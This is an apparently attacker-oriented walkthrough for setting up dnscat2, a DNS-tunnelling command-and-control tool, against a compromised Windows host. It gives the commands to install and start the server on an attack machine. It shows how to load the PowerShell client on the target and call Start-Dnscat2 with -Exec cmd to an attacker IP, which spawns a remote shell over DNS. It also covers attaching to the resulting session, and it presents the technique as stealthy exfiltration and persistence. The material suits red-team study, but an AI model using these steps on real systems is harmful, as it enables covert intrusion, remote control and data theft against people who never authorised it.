[Dnscat2](https://github.com/iagox86/dnscat2) is a DNS tunneling tool that allows data transfer between two hosts using the DNS protocol instead of traditional network channels. It creates an encrypted Command and Control (C2) channel by embedding data inside DNS TXT records.

Dnscat2 sends specially crafted DNS requests to an attacker-controlled server and instead of resolving legitimate domains, these requests carry commands and exfiltrated data.

Because DNS traffic is almost always allowed through firewalls and rarely inspected deeply, DNS tunneling is a stealthy method for persistence, remote command execution, and data exfiltration.

---

## Server Setup (Attack Host – Linux/Kali)

### Clone and install dnscat2 server

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### Start dnscat2 DNS server

```bash
sudo ruby dnscat2.rb --dns host=<attacker_ip>,port=53,domain=<domain> --no-cache
```

After starting, dnscat2 generates a **Pre-Shared Secret** used for encrypted authentication.

---

## Client Setup (Windows Target)

### Clone PowerShell client on attacker machine

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Transfer `dnscat2.ps1` to the compromised Windows host.


### Import the module

```powershell
Import-Module .\dnscat2.ps1
```


### Establish DNS tunnel and spawn CMD shell

```powershell
Start-Dnscat2 -DNSserver <attacker_ip> `
              -Domain <domain> `
              -PreSharedSecret <Pre-Shared Secret> `
              -Exec cmd
```


---

## Verifying Connection (Server Side)

If successful:

```
Session 1 Security: ENCRYPTED AND VERIFIED!
```

---

## Interacting with Sessions

### List available commands

```
dnscat2> ?
```

### Attach to a session

```
dnscat2> window -i 1
```

You will receive an interactive Windows shell:

```
C:\Windows\system32>
```

To return to dnscat2 console:

```
CTRL + Z
```
